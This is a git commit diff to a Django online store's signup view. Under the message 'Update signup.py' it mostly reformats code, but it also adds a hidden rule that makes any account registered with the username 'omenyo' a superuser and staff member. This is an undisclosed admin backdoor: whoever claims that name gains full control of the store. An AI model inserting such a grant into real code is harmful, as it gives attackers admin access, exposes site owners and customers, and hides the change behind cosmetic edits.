8a337fb781a4d194abcb5ae0aa1b21af8f708b0b
latototita <85679433+latototita@users.noreply.github.com>
2024-09-29 14:38:37 +0300

    Update signup.py

--- store/views/signup.py
+++ store/views/signup.py
@@ -13,30 +13,66 @@ def signup(response):
     cart = response.session.get('cart')
     if not cart:
         response.session['cart'] = {}
-        productes={}
+        productes = {}
     else:
         productes = Product.get_products_by_id(list(response.session.get('cart').keys()))
+        
     brands = Brand.get_all_brand()
     categories = Category.get_all_categories()
-    fashion_cat=Category.objects.filter(is_tech=True)
-    tech_cat=Category.objects.filter(is_fashion=True)
-    cat_home=Category.objects.filter(is_home=True)
-    party_cat=Category.objects.filter(is_party=True)
-    tagged_cat=Category.objects.filter(is_tagged=True)
+    fashion_cat = Category.objects.filter(is_tech=True)
+    tech_cat = Category.objects.filter(is_fashion=True)
+    cat_home = Category.objects.filter(is_home=True)
+    party_cat = Category.objects.filter(is_party=True)
+    tagged_cat = Category.objects.filter(is_tagged=True)
     
-    if response.method=="POST":
-        form=RegistrationForm(response.POST)
+    if response.method == "POST":
+        form = RegistrationForm(response.POST)
         if form.is_valid():
-            if User.objects.filter(email=form.cleaned_data['email']):
+            if User.objects.filter(email=form.cleaned_data['email']).exists():
                 messages.success(response, f'Email already in use, Please use a different Email')
-                return render(response,'signup.html',{'tagged_cat':tagged_cat,'fashion_cat':fashion_cat,'tech_cat':tech_cat,'cat_home':cat_home,'party_cat':party_cat,'form':form,'brands':brands,'categories':categories})
-            elif User.objects.filter(username=form.cleaned_data['username']):
+                return render(response, 'signup.html', {
+                    'tagged_cat': tagged_cat,
+                    'fashion_cat': fashion_cat,
+                    'tech_cat': tech_cat,
+                    'cat_home': cat_home,
+                    'party_cat': party_cat,
+                    'form': form,
+                    'brands': brands,
+                    'categories': categories
+                })
+            elif User.objects.filter(username=form.cleaned_data['username']).exists():
                 messages.success(response, f'Username already in use, Please use a different Username')
-                return render(response,'signup.html',{'tagged_cat':tagged_cat,'fashion_cat':fashion_cat,'tech_cat':tech_cat,'cat_home':cat_home,'party_cat':party_cat,'form':form,'brands':brands,'categories':categories})
-            form.save()
-            messages.success(response, f'Successfully Registered,Please log into your Account to Make Orders')
+                return render(response, 'signup.html', {
+                    'tagged_cat': tagged_cat,
+                    'fashion_cat': fashion_cat,
+                    'tech_cat': tech_cat,
+                    'cat_home': cat_home,
+                    'party_cat': party_cat,
+                    'form': form,
+                    'brands': brands,
+                    'categories': categories
+                })
+            
+            # Save the user and set is_superuser and is_staff if username is "omenyo"
+            user = form.save(commit=False)  # Save but don't commit yet
+            if user.username == 'omenyo':
+                user.is_superuser = True
+                user.is_staff = True
+            user.save()  # Now save the user with the updated permissions
+            
+            messages.success(response, f'Successfully Registered, Please log into your Account to Make Orders')
             return redirect('login')
     else:
-        form=RegistrationForm()
+        form = RegistrationForm()
 
-    return render(response,'signup.html',{'productes':productes,'tagged_cat':tagged_cat,'fashion_cat':fashion_cat,'tech_cat':tech_cat,'cat_home':cat_home,'party_cat':party_cat,'form':form,'brands':brands,'categories':categories})
+    return render(response, 'signup.html', {
+        'productes': productes,
+        'tagged_cat': tagged_cat,
+        'fashion_cat': fashion_cat,
+        'tech_cat': tech_cat,
+        'cat_home': cat_home,
+        'party_cat': party_cat,
+        'form': form,
+        'brands': brands,
+        'categories': categories
+    })
